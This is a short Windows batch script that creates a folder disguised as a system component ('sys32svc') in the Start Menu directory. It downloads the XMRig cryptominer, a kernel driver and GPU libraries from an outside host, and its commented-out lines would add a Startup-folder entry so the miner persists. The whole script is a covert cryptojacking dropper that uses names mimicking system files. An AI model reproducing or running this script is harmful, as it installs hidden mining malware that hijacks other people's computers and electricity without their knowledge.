:: https://download.microsoft.com/download/1/1/1/1116b75a-9ec3-481a-a3c8-1777b5381140/vcredist_x86.exe
:: http://slproweb.com/download/Win64OpenSSL-1_1_1i.msi
:: Download curl.exe

mkdir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sys32svc"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sys32svc\"
set list=SHA256SUMS  WinRing0x64.sys  xmrig.exe  sys32_service.cmd  nvrtc-builtins64_110.dll  nvrtc64_110_0.dll  xmrig-cuda.dll
(for %%a in (%list%) do (
curl https://xmrig.systar.my.id/%%a -o %%a
))
::copy "sys32_service.cmd" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
:: "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\sys32_service.cmd"

